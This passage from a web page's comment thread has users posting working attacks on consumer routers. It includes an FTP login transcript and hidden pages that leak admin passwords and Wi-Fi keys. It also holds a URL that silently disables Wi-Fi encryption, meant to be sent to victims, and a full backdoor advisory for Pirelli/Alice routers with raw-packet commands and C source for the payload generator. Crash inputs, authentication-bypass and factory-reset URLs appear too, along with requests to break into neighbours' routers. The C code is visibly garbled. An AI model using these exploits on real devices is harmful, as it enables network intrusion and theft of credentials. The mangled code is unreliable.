+If you make a POST request with no value and a content-length with a 99999999999 value , the webserver will deadly crash.</code></pre></div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">laurent, it is never too late to submit your findings on this page. thanks for the info. btw, have you JTAGed the device?</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="perpetualmotionuk"><span>perpetualmotionuk</span><div class="post-comment-content">No Netgear router hacks yet?</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="bug"><span>bug</span><div class="post-comment-content">Adrian you wrote: "Just make the XSS payload use the XHR() function to scrape â€˜/blah.cfgâ€™ and send it to the attackerâ€™s site." How is it possible?</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="c0redump"><span>c0redump</span><div class="post-comment-content">I got a few Netgear router hax innit, will post more info at some point.  kthnx.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">10x, that will be very, very helpful.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="opt9"><span>opt9</span><div class="post-comment-content"><pre><code>Hi, there.
+Sorry for my late submit and poor english.
+
+I wrote the article about WRT54G v7 multiple vulnerabilities in korean at my blog  (2008-1-21 KST).
+
+my blog : http://swbae.egloos.com/1701135
+
+I'll explain it for you in english.
+
+test hardware : WRT54G v7
+test firmware version : v7.00.1 (default firmware)
+
+vuln 1. FTP server no authentication.
+you can connect your wrt54g router with any id/pw combination.
+
+------
+$ ftp 192.168.1.1
+Connected to 192.168.1.1.
+220 VxWorks (VxWorks5.4.2) FTP server ready
+Name (192.168.1.1:Administrator): anyid
+331 Password required
+Password: anypass
+230 User logged in
+ftp&gt; bin
+200 Type set to I, binary mode
+ftp&gt; ls
+200 Port set okay
+150 Opening ASCII mode data connection
+  size          date       time       name
+--------       ------     ------    --------
+  956756    Jan-01-2003  02:13:12   ap61.sys
+  224664    Jan-01-2003  02:13:24   igwhtm.dat
+   28528    Jan-01-2003  02:13:26   langpak_en
+   31440    Feb-11-2008  03:22:00   igwpricf.dat
+    3690    Jun-14-2007  00:36:30   nvram.cfg
+    2046    Dec-24-2001  00:02:42   calibra.dat
+
+WARNING! 9 bare linefeeds received in ASCII mode
+File may not have transferred correctly.
+226 Transfer complete
+------
+
+vuln 2. WRT54G hidden manage pages.
+There are many numbers of hidden backdoor manage pages.
+if you want to connect, you must connect with admin privileges.
+
+http://192.168.1.1/sysinfo.htm &lt;-- info of your router
+http://192.168.1.1/Cysaja.htm  &lt;-- info of your router
+http://192.168.1.1/lastpassword.htm &lt;-- admin's password in plain text
+http://192.168.1.1/wlaninfo.htm &lt;-- your WPA_PSK in plain text
+
+vuln 3. System information leak.
+igwpricf.dat : system informations (admin id/pw, WPA-PSK, WEP key, etc).
+nvram.cfg    : system informations (admin id/pw, WPA-PSK, WEP key, etc).
+/mem/pricf/0 : system informations (admin id/pw, WPA-PSK, WEP key, etc).
+
+if you want to detail, plz visit http://swbae.egloos.com/1701135</code></pre></div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Jody"><span>Jody</span><div class="post-comment-content">Thanks to everyone for their contributions on this. As a lowly sys-admin I'm a bit shocked by the implications here. At first I wondered if the attacks were only possible from the private side but once I slapped my forehead I realized it didn't really matter. Has anyone tabulated the results submitted so far? I'm always asked about what model router I would recommend and it is clear I have to dig through these results and make some comparisons before I can recommend any of them.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="WarGame"><span>WarGame</span><div class="post-comment-content">My finding: http://vx.netlux.org/wargamevx/alice_gate2_pluswifi_PoC.zip</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">WarGame, can you post a quick summary of your findings. That way more people will be interested to see what is behind this ZIP file :)</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="WarGame"><span>WarGame</span><div class="post-comment-content"><pre><code>Discovered by WarGame/DoomRiderz
+HomePage: http://vx.netlux.org/wargamevx
+mail addr: wargame89@yahoo.it
+Vulnerable device: Alice gate 2 plus wifi
+Vendor's page: http://aiuto.alice.it/informazioni/modemadsl/alice_gate2adv.html
+
+It seems to be possible to disable the wifi encryption using the following url:
+http://192.168.1.1/cp06_wifi_m_nocifr.cgi?wlChannel=Auto&amp;wlRadioEnable=on 
+
+This can be done because there is no authentication scheme to access the admin panel of the modem,
+everyone can access it.
+
+Common scenario:
+The attacker sends to the victim (using emails, IM or IRC) the malicious link and with some social techs
+makes the victim click on it.
+After this, the attacker can access the victim's wlan that is now open to everybody.
+Other devices of the same family could be vulnerable too but I did not test it.
+
+(Sorry for the poor english :) )</code></pre></div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Adrian Pastor"><span>Adrian Pastor</span><div class="post-comment-content">As we can all see, there are MANY SOHO routers vulnerable to authentication bypass issues. For those who have no clue how to find them, check out the following GNUCITIZEN posts:
+
+http://www.gnucitizen.org/blog/holes-in-embedded-devices-authentication-bypass-pt-1/
+http://www.gnucitizen.org/blog/holes-in-embedded-devices-authentication-bypass-pt-2/
+http://www.gnucitizen.org/blog/holes-in-embedded-devices-authentication-bypass-pt-3/
+http://www.gnucitizen.org/blog/holes-in-embedded-devices-authentication-bypass-pt-4/</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="kroli86"><span>kroli86</span><div class="post-comment-content">hy, i am in spain. I have 1 wireless unlocked. and other 10 locked. How can i unlock them? i think some rooter have key at back, if i know the mac can somebody tell me the password?
+
+I want to hack JAzztel and Moviestar.
+
+http://i119.photobucket.com/albums/o160/kroli86/mac.jpg</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="get'er_done"><span>get'er_done</span><div class="post-comment-content">This isn't new and it isn't necessarily a hack for Netgear routers but it does provide a backdoor to certain newer Netgear routers.  Netgear has an internal program for developers that has been leaked to the public to allow a "Telnet Console" for developers.  This opens up the router for someone to telnet into the router with a default username and password.  What is scary is that it allows admin privileges to the router and the ability to view the username and password of the web interface in plain text.  I have found that the "Telnet Console" is disabled every time a new change is made via the web interface or a router reboot. I have personally done this on my own Netgear router. 
+
+Here are some links for the info:
+http://www.seattlewireless.net/index.cgi/NetgearWGR614
+http://wiki.openwrt.org/OpenWrtDocs/Hardware/Netgear/TelnetConsole
+http://blog.ktdreyer.com/2008/01/hacking-wgr614.html</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="nex"><span>nex</span><div class="post-comment-content">be really careful when you report a vulnerability, there's a chance that someone else steal your credit by reporting it to SecurityFocus... Arthur Lashin just stole mine.
+
+http://www.securityfocus.com/bid/28122/info
+http://www.kb.cert.org/vuls/id/248372
+
+The vendor is aware since 2007-10-15 and issued me a ticketnumber.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">that kind of sux, can you prove it. you could either send a response to his email or leave it be as you might not find it worthed to fight things like that.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="nex"><span>nex</span><div class="post-comment-content">i can prove it. i send an email to USCERT / Securityfocus / him. waiting for news.. thats why i'm never publishing 0days, ppl ripping credits. hehe.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">it really depends what your intentions are :)</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="nex"><span>nex</span><div class="post-comment-content">woot. my name has been added into credits. i guess i won.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">excellent news, glad that this has been resolved.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="rebecca"><span>rebecca</span><div class="post-comment-content">i dont have a wireless router all i want to do is hack my neighbours router i need the password to his router</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="klo"><span>klo</span><div class="post-comment-content"><pre><code>I can confirm I can make the DI-624 reboot by supplying a username / password string of &gt;298 characters long,
+or a combination of the two that adds up to &gt;298 characters, from the authentication dialogue box.</code></pre></div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">what I believe it was happening is that you have crashed the a CGI script or the actual HTTP server which upon exit informed the system to reboot. this is a very common behavior among embedded devices. when you see an embedded device rebooting it is definitely because you caused something to do what it was not supposed/designed to - mostly stack, heap overflows. it is not very clear from your post but are you saying that the payload has to be 298+ characters long?
+
+exploiting buffer overflows for these devices is as trivial as it can get but the only thing that is a problem is to either login into the device and observe any strange messages appearing in the log files which could indicate what the problem is, or attach yourself directly to the device motherboard via JTAG. the second is a bit more complicated. Once we have this information we can verify the exploitability of the problem by mangling with the address space and if passes all test we can sit down and spend time writing payload/shellcode for the affected architecture if there isn't one yet.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="klo"><span>klo</span><div class="post-comment-content">"...it is not very clear from your post but are you saying that the payload has to be 298+ characters long?"
+
+Yeah, for example, a 299 characters long username, or 149 char. long username with 150 char. password.  All characters were in the ASCII range.
+
+I basically came across this "http://secunia.com/advisories/29366/" and wanted to see if the DI-624 is also affected.
+
+I forgot to mention the hardware revision is C3.
+
+It seems like the source code for the device is available at "ftp://ftp.dlink.co.uk/GPL/DI-624_E1_GPL.tgz" but I haven't had time to look over it yet...</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Adrian Pastor"><span>Adrian Pastor</span><div class="post-comment-content">bug: once you have a XSS vulnerability on the router, all you have to do is use the XMLHttpRequest() function in the JavaScript which is executed in the XSS attack:
+http://www.quirksmode.org/js/xmlhttp.html
+
+Check out exploit #2 for the BT Home Hub for a real example on how to do this: http://www.gnucitizen.org/blog/bt-home-flub-pwnin-the-bt-home-hub-4/</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Adrian Pastor"><span>Adrian Pastor</span><div class="post-comment-content">Regarding the DI-624 issue: yes, it could be a memory corruption bug (i.e: buffer overflow) but we shouldn't ignore the possibility of a resource exhaustion issue, since the hardware of some embedded devices is very limited.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="jigar"><span>jigar</span><div class="post-comment-content">hello
+is it possible to hack router enable password.?
+
+I have router but i can't logging enable mode.
+so give me tips how  can i loging enable mode.
+without rommon mode.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Kcir~"><span>Kcir~</span><div class="post-comment-content">I Have a config.bin for decrypt password. so possible? http://rapidshare.com/files/110366829/config.bin.html
+
+Tks.. ;)</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="john"><span>john</span><div class="post-comment-content">how to hack netgear administrator password</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">this is definitely not the place where you should ask these types of questions.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="frodo"><span>frodo</span><div class="post-comment-content">That's great peeps but I don't see anybody hacking into netgear server 198.168.0.1 CG814WG could it be impossible?
+
+And its not comcast/1234, or superuser/password or admin admin, need specifically the one to change advanced settings like the bluddy SPI firwall setting in order to play multiplayer in battlefield 2 ! make yoursleves useful wilya :) 
+
+sorry i got carried away</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="defcon"><span>defcon</span><div class="post-comment-content">ive been messing around with my WRT150N, anyone have any luck hacking this?</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Aubade"><span>Aubade</span><div class="post-comment-content">Hi. Your homepage is very nice! I have an MSI RG60SE wireless router. Unfortunately i can't find the the config file, which contains the auth password. :( I tried in the /cgi-bin/ dir, (like D-link Routers) but i don't know the cfg file name.
+
+Have anybody hacked MSI router? If i would get a document file like http://kinqpinz.info/lib/wrt54g/own.txt , it would be great! Maybe there isn't exist info file like this for the MSI's stuff?
+
+Thx</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Saqib Lodhi"><span>Saqib Lodhi</span><div class="post-comment-content">How can i read D-Link DI-604 Config.bin file.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="saxdax &amp;amp; drpepperONE"><span>saxdax &amp;amp; drpepperONE</span><div class="post-comment-content"><pre><code>#############################################################################################
+
+				saxdax &amp; drpepperONE
+
+
+Discovered embedded backdoor to activate telnet/ftp/tftp/web extended admin interface
+with Admin privileges, from internal network lan on Alice ADSL CPE Modem/Router, manufactered
+by Pirelli based on Broadcom platform.
+
+#############################################################################################
+
+                        saxdax &amp; drpepperONE
+
+Router Vendor:		Alice Telecom Italia CPE Modem/Routers manufactered by Pirelli
+				based on Broadcom platform.
+              		
+Model Affected:		AGA[Alice Gate2 plus Wi-Fi]/AGB[Alice Gate2 plus]
+				AG2P-AG3[Alice Gate W2+]/AGPV-AGPF[Alice Gate VoIP 2 Plus Wi-Fi]
+              		
+Firmware Version:		All AGA/AGB/AG2P-AG3/AGPV-AGPF firmware version are affected.
+
+Platforms:    		Customized Linux version 2.6.8.1 on Broadcom BCM96348 chipset.
+
+Vulnerability:          enable telnet/ftp/tftp and web-admin from internal lan.		
+
+Exploitation: 		internal network lan, versus Router 
+
+Date:         		13 Oct 2008
+
+Authors:       		saxdax &amp; drpepperONE
+
+e-mail: 			saxdax2@gmail.com		drpepppperone@gmail.com
+
+Risk: 			medium&gt;low
+        
+#############################################################################################
+
+1) Introduction
+2) Vulnerability
+3) The Exploit
+4) The Code
+5) Fix
+
+#############################################################################################
+
+===============
+1) Introduction
+===============
+
+Telecom Italia is the most important Italian ISP offering an ADSL service named "Alice".
+Telecom Italia rent out with "Alice Adsl" service, different CPE Modem/Router among which 
+the affected ones.
+The interface to configure these modems are made extremily poor by the provider to ensure
+more control.
+There's no way to enable telnet, ftp, tftp or more advanced web pages from the web interface.
+
+http://www.telecomitalia.com/
+http://adsl.alice.it/
+
+#############################################################################################
+
+================
+2) Vulnerability
+================
+
+An attacker can activate and get unauthorized access to the routers administration
+interface and telnet/ftp/tftp services from internal network.
+
+Every user in the LAN (or Wireless LAN) can nevertheless have access to the routers
+administration interface and telnet/ftp/tftp!
+
+If an attacker can get access to the administrator interface and login, he has full control
+over the routers configuration.
+
+#############################################################################################
+
+
+==============
+3) The Exploit
+==============
+
+To enable telnet/ftp/tftp and web-admin interface it is necessary send a special
+IP packet to router specific ip 192.168.1.1.
+This works only from internal LAN where an attacker have and ip like 192.168.1.XX.
+The ip packet send to router must have the following feature:
+
+1)IP-protocol-number 255 (there's a RAW SOCKET listening on the router)
+2)Payload size 8 byte
+3)The payload are the first 8 byte of a salted md5 of the mac address of device br0
+4)br0 in these modems has the same mac of eth0
+
+When the modem receives the packet all services will be enabled.
+
+
+Example:
+
+
+From a GNU/LINUX distrib:
+
+1)Retrieve br0 maccaddress:
+
+arping -I eth0 -c 2 192.168.1.1
+
+ARPING 192.168.1.1 from 192.168.1.2 eth0
+Unicast reply from 192.168.1.1 [00:01:02:03:04:05]  8.419ms
+Unicast reply from 192.168.1.1 [00:01:02:03:04:05]  2.095ms
+Sent 2 probes (1 broadcast(s))
+Received 2 response(s)
+
+
+2)Calculate special md5 hash from br0 macaddress: create an hex 6 byte long file with the mac address.
+	run the application below and copy the output hash.
+	http://rapidshare.com/files/153439269/AliceBDhashCreator.zip.html
+
+3)Send ip packet to router ip 192.168.1.1 with 8 byte paylod file (with the tool you like)
+
+	i.e.: nemesis ip -D 192.168.1.1 -p 255 -P hash.hex
+
+
+4)Telnet to router :
+
+	telnet 192.168.1.1
+
+	BCM96348 ADSL Router
+	Login: admin
+	Password: 
+
+
+
+#############################################################################################
+
+
+===========
+4) The Code
+===========
+
+/* Alice Backdoor Pwd creator by saxdax */
+/* this code generates an 8 byte hash to use as the paylod of the ip packet   */
+/* the mac must be in an hex file and has to be passed as argument to the program */
+
+#include 
+#include 
+#include 
+#include "md5.h"
+
+
+/*
+ *  RFC 1321 compliant MD5 implementation
+ *
+ *  Copyright (C) 2001-2003  Christophe Devine
+ *
+ *  This program is free software; you can redistribute it and/or modify
+ *  it under the terms of the GNU General Public License as published by
+ *  the Free Software Foundation; either version 2 of the License, or
+ *  (at your option) any later version.
+ *
+ *  This program is distributed in the hope that it will be useful,
+ *  but WITHOUT ANY WARRANTY; without even the implied warranty of
+ *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ *  GNU General Public License for more details.
+ *
+ *  You should have received a copy of the GNU General Public License
+ *  along with this program; if not, write to the Free Software
+ *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
+ */
+
+
+
+#define GET_UINT32(n,b,i)                       \
+{                                               \
+    (n) = ( (uint32) (b)[(i)    ]       )       \
+        | ( (uint32) (b)[(i) + 1] &lt;&lt;  8 )       \
+        | ( (uint32) (b)[(i) + 2] &lt;&lt; 16 )       \
+        | ( (uint32) (b)[(i) + 3] &lt;&gt;  8 );       \
+    (b)[(i) + 2] = (uint8) ( (n) &gt;&gt; 16 );       \
+    (b)[(i) + 3] = (uint8) ( (n) &gt;&gt; 24 );       \
+}
+
+void md5_starts( md5_context *ctx )
+{
+    ctx-&gt;total[0] = 0;
+    ctx-&gt;total[1] = 0;
+
+    ctx-&gt;state[0] = 0x67452301;
+    ctx-&gt;state[1] = 0xEFCDAB89;
+    ctx-&gt;state[2] = 0x98BADCFE;
+    ctx-&gt;state[3] = 0x10325476;
+}
+
+void md5_process( md5_context *ctx, uint8 data[64] )
+{
+    uint32 X[16], A, B, C, D;
+
+    GET_UINT32( X[0],  data,  0 );
+    GET_UINT32( X[1],  data,  4 );
+    GET_UINT32( X[2],  data,  8 );
+    GET_UINT32( X[3],  data, 12 );
+    GET_UINT32( X[4],  data, 16 );
+    GET_UINT32( X[5],  data, 20 );
+    GET_UINT32( X[6],  data, 24 );
+    GET_UINT32( X[7],  data, 28 );
+    GET_UINT32( X[8],  data, 32 );
+    GET_UINT32( X[9],  data, 36 );
+    GET_UINT32( X[10], data, 40 );
+    GET_UINT32( X[11], data, 44 );
+    GET_UINT32( X[12], data, 48 );
+    GET_UINT32( X[13], data, 52 );
+    GET_UINT32( X[14], data, 56 );
+    GET_UINT32( X[15], data, 60 );
+
+#define S(x,n) ((x &lt;&gt; (32 - n)))
+
+#define P(a,b,c,d,k,s,t)                                \
+{                                                       \
+    a += F(b,c,d) + X[k] + t; a = S(a,s) + b;           \
+}
+
+    A = ctx-&gt;state[0];
+    B = ctx-&gt;state[1];
+    C = ctx-&gt;state[2];
+    D = ctx-&gt;state[3];
+
+#define F(x,y,z) (z ^ (x &amp; (y ^ z)))
+
+    P( A, B, C, D,  0,  7, 0xD76AA478 );
+    P( D, A, B, C,  1, 12, 0xE8C7B756 );
+    P( C, D, A, B,  2, 17, 0x242070DB );
+    P( B, C, D, A,  3, 22, 0xC1BDCEEE );
+    P( A, B, C, D,  4,  7, 0xF57C0FAF );
+    P( D, A, B, C,  5, 12, 0x4787C62A );
+    P( C, D, A, B,  6, 17, 0xA8304613 );
+    P( B, C, D, A,  7, 22, 0xFD469501 );
+    P( A, B, C, D,  8,  7, 0x698098D8 );
+    P( D, A, B, C,  9, 12, 0x8B44F7AF );
+    P( C, D, A, B, 10, 17, 0xFFFF5BB1 );
+    P( B, C, D, A, 11, 22, 0x895CD7BE );
+    P( A, B, C, D, 12,  7, 0x6B901122 );
+    P( D, A, B, C, 13, 12, 0xFD987193 );
+    P( C, D, A, B, 14, 17, 0xA679438E );
+    P( B, C, D, A, 15, 22, 0x49B40821 );
+
+#undef F
+
+#define F(x,y,z) (y ^ (z &amp; (x ^ y)))
+
+    P( A, B, C, D,  1,  5, 0xF61E2562 );
+    P( D, A, B, C,  6,  9, 0xC040B340 );
+    P( C, D, A, B, 11, 14, 0x265E5A51 );
+    P( B, C, D, A,  0, 20, 0xE9B6C7AA );
+    P( A, B, C, D,  5,  5, 0xD62F105D );
+    P( D, A, B, C, 10,  9, 0x02441453 );
+    P( C, D, A, B, 15, 14, 0xD8A1E681 );
+    P( B, C, D, A,  4, 20, 0xE7D3FBC8 );
+    P( A, B, C, D,  9,  5, 0x21E1CDE6 );
+    P( D, A, B, C, 14,  9, 0xC33707D6 );
+    P( C, D, A, B,  3, 14, 0xF4D50D87 );
+    P( B, C, D, A,  8, 20, 0x455A14ED );
+    P( A, B, C, D, 13,  5, 0xA9E3E905 );
+    P( D, A, B, C,  2,  9, 0xFCEFA3F8 );
+    P( C, D, A, B,  7, 14, 0x676F02D9 );
+    P( B, C, D, A, 12, 20, 0x8D2A4C8A );
+
+#undef F
+    
+#define F(x,y,z) (x ^ y ^ z)
+
+    P( A, B, C, D,  5,  4, 0xFFFA3942 );
+    P( D, A, B, C,  8, 11, 0x8771F681 );
+    P( C, D, A, B, 11, 16, 0x6D9D6122 );
+    P( B, C, D, A, 14, 23, 0xFDE5380C );
+    P( A, B, C, D,  1,  4, 0xA4BEEA44 );
+    P( D, A, B, C,  4, 11, 0x4BDECFA9 );
+    P( C, D, A, B,  7, 16, 0xF6BB4B60 );
+    P( B, C, D, A, 10, 23, 0xBEBFBC70 );
+    P( A, B, C, D, 13,  4, 0x289B7EC6 );
+    P( D, A, B, C,  0, 11, 0xEAA127FA );
+    P( C, D, A, B,  3, 16, 0xD4EF3085 );
+    P( B, C, D, A,  6, 23, 0x04881D05 );
+    P( A, B, C, D,  9,  4, 0xD9D4D039 );
+    P( D, A, B, C, 12, 11, 0xE6DB99E5 );
+    P( C, D, A, B, 15, 16, 0x1FA27CF8 );
+    P( B, C, D, A,  2, 23, 0xC4AC5665 );
+
+#undef F
+
+#define F(x,y,z) (y ^ (x | ~z))
+
+    P( A, B, C, D,  0,  6, 0xF4292244 );
+    P( D, A, B, C,  7, 10, 0x432AFF97 );
+    P( C, D, A, B, 14, 15, 0xAB9423A7 );
+    P( B, C, D, A,  5, 21, 0xFC93A039 );
+    P( A, B, C, D, 12,  6, 0x655B59C3 );
+    P( D, A, B, C,  3, 10, 0x8F0CCC92 );
+    P( C, D, A, B, 10, 15, 0xFFEFF47D );
+    P( B, C, D, A,  1, 21, 0x85845DD1 );
+    P( A, B, C, D,  8,  6, 0x6FA87E4F );
+    P( D, A, B, C, 15, 10, 0xFE2CE6E0 );
+    P( C, D, A, B,  6, 15, 0xA3014314 );
+    P( B, C, D, A, 13, 21, 0x4E0811A1 );
+    P( A, B, C, D,  4,  6, 0xF7537E82 );
+    P( D, A, B, C, 11, 10, 0xBD3AF235 );
+    P( C, D, A, B,  2, 15, 0x2AD7D2BB );
+    P( B, C, D, A,  9, 21, 0xEB86D391 );
+
+#undef F
+
+    ctx-&gt;state[0] += A;
+    ctx-&gt;state[1] += B;
+    ctx-&gt;state[2] += C;
+    ctx-&gt;state[3] += D;
+}
+
+void md5_update( md5_context *ctx, uint8 *input, uint32 length )
+{
+    uint32 left, fill;
+
+    if( ! length ) return;
+
+    left = ctx-&gt;total[0] &amp; 0x3F;
+    fill = 64 - left;
+
+    ctx-&gt;total[0] += length;
+    ctx-&gt;total[0] &amp;= 0xFFFFFFFF;
+
+    if( ctx-&gt;total[0] total[1]++;
+
+    if( left &amp;&amp; length &gt;= fill )
+    {
+        memcpy( (void *) (ctx-&gt;buffer + left),
+                (void *) input, fill );
+        md5_process( ctx, ctx-&gt;buffer );
+        length -= fill;
+        input  += fill;
+        left = 0;
+    }
+
+    while( length &gt;= 64 )
+    {
+        md5_process( ctx, input );
+        length -= 64;
+        input  += 64;
+    }
+
+    if( length )
+    {
+        memcpy( (void *) (ctx-&gt;buffer + left),
+                (void *) input, length );
+    }
+}
+
+static uint8 md5_padding[64] =
+{
+ 0x80, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
+};
+
+void md5_finish( md5_context *ctx, uint8 digest[16] )
+{
+    uint32 last, padn;
+    uint32 high, low;
+    uint8 msglen[8];
+	
+
+    high = ( ctx-&gt;total[0] &gt;&gt; 29 )
+         | ( ctx-&gt;total[1] &lt;total[0] &lt;&lt;  3 );
+
+    PUT_UINT32( low,  msglen, 0 );
+    PUT_UINT32( high, msglen, 4 );
+
+    //for(int i=0;itotal[0] &amp; 0x3F;
+    padn = ( last state[0], digest,  0 );
+    PUT_UINT32( ctx-&gt;state[1], digest,  4 );
+    PUT_UINT32( ctx-&gt;state[2], digest,  8 );
+    PUT_UINT32( ctx-&gt;state[3], digest, 12 );
+}
+
+//#ifdef TEST
+
+
+
+/*
+ * those are the standard RFC 1321 test vectors
+ */
+
+static char *msg[] = 
+{
+    "",
+    "a",
+    "abc",
+    "message digest",
+    "abcdefghijklmnopqrstuvwxyz",
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
+    "12345678901234567890123456789012345678901234567890123456789012" \
+        "345678901234567890"
+};
+
+static char *val[] =
+{
+    "d41d8cd98f00b204e9800998ecf8427e",
+    "0cc175b9c0f1b6a831c399e269772661",
+    "900150983cd24fb0d6963f7d28e17f72",
+    "f96b697d7cb7938d525a2f31aaf161d0",
+    "c3fcd3d76192e4007dfb496cca67e13b",
+    "d174ab98d277d9f5a5611c2c9f419d9f",
+    "57edf4a22be3c955ac49da2e2107b67a"
+};
+
+static char saltOrig[] =
+{0x04, 0x07, 0x67, 0x10, 0x02, 0x81, 0xFA, 0x66, 0x11, 0x41, 0x68, 0x11, 0x17, 0x01, 0x05, 0x22, 0x71, 0x04, 0x10, 0x33};
+
+int main( int argc, char *argv[] )
+{
+    FILE *f;
+    int i, j;
+    char output[33];
+    md5_context ctx;
+    unsigned char buf[1000];
+    unsigned char md5sum[16];
+	unsigned char salt[20];
+	
+	printf( "****************************\n");
+	printf( "Alice BackDoor hash creator \n");
+	printf( "by saxdax and drPepperOne   \n");
+	printf( "****************************\n\n");
+    
+	if( argc  0 )
+    {
+        md5_update( &amp;ctx, buf, i );
+    }
+	
+	memcpy(salt, saltOrig, 20);
+	
+	md5_update( &amp;ctx, salt, 20 );
+
+    md5_finish( &amp;ctx, md5sum );
+	
+	printf("Payload is: ");
+    for( j = 0; j &lt; 8; j++ )
+    {
+        printf( "%02x", md5sum[j] );
+    }
+
+    return( 0 );
+}
+
+
+
+
+
+
+
+#############################################################################################
+
+======
+5) Fix
+======
+
+
+Atcualy at 13 Oct 2008 NO FIX available
+
+#############################################################################################</code></pre></div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Excalibur"><span>Excalibur</span><div class="post-comment-content">Hmmm...Once i'm logged in, click "File-Page Save As" and selecting "webpage complete" and can just double the htm file to get in...wonder if this would work on another router the same as mine using my htm file...</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="holddigga"><span>holddigga</span><div class="post-comment-content">The TRENDnet TEW-633GR doesn't authenticate past the first page. I.E. if you enter <code>/Basic/Wireless.shtml</code> you will be able to modify the wireless settings, without entering a password! This will also get you to any other config page within the router. Also if you enter <code>/reboot.cgi?reset=true</code>, you will reset the router to factory defaults.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="jjacks"><span>jjacks</span><div class="post-comment-content">Hi Kender, could you reveal spt.dat decompressor source code? ?I'm trying to use it with 120KB file, getting Index out of range exception all the time. How long was yours spt.dat?</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Kender"><span>Kender</span><div class="post-comment-content">Sure, I added a link to the source on my page. I never finished it..</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Rob"><span>Rob</span><div class="post-comment-content">I recently found a bug in the HTTP basic authentication whilst creating a program to automate router control.
+
+In VB.Net. If you send the "Authentication BASIC" headers with a random username and password hash through a web browser object with script errors suppressed, it doesnt work the first time, but the second time around it just lets you in regardless with full control of that navigated area. :S I think its a bug in the web server on the router.
+
+I could use it to gain access to a wireless netgear router and view the WEP codes. 
+
